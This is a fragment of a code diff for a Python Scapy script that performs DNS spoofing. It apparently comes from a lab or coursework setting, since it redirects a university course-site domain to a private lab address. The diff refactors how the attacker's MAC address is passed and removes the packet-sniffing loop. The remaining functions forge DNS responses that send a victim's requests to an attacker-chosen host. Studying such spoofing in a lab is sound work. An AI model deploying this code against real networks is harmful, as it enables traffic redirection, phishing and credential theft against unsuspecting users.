@@ -33,10 +33,8 @@ redirect_to ={
     b"www.canvas.tue.nl" : "192.168.56.102"
 
 }
-def fake_dns_response(pkt, hostIP, networkInterface):
+def fake_dns_response(pkt, hostIP, networkInterface, attackerMAC):
     hostMAC = util.getMAC(hostIP, networkInterface)
-    attackerMAC = get_if_hwaddr(networkInterface)
-
     dns = Ether(src = attackerMAC, dst = hostMAC)/\
           IP(dst = hostIP, src = pkt[IP].dst) /\
           UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport) /\
@@ -46,9 +44,9 @@ def fake_dns_response(pkt, hostIP, networkInterface):
 
     sendp(dns, iface = networkInterface, verbose = False)
 
-def dns_call(pkt, hostIP, mac, networkInterface):
+def dns_call(pkt, hostIP, mac, networkInterface, attackerMAC):
     website = pkt[DNSQR].qname
-    if mac == attackerMAC
+    if mac == attackerMAC:
         return
 
     if website not in redirect_to:
@@ -56,22 +54,11 @@ def dns_call(pkt, hostIP, mac, networkInterface):
         pkt.show()
         return
     else:
-          fake_dns_response(pkt, hostIP, networkInterface)
-
-
-#capture dns request and response packets
-def dns_sniff(pkt):
-    print("get there")
-    if pkt.haslayer('UDP') and pkt.haslayer('DNS') and pkt.haslayer('IP'):
-        ip = pkt[IP].src
-        if pkt.haslayer('Ether'):
-            mac = pkt[Ether].src
-        else :
-            mac = util.getMAC(ip, networkInterface)
-    pkt.show()
-    dns_call(pkt, ip, mac, networkInterface)
+          fake_dns_response(pkt, hostIP, networkInterface, attackerMAC)
 
 
 
 
-sniff(filter = "udp port 53", iface = networkInterface, prn = dns_sniff, store = 0)
+
+
+
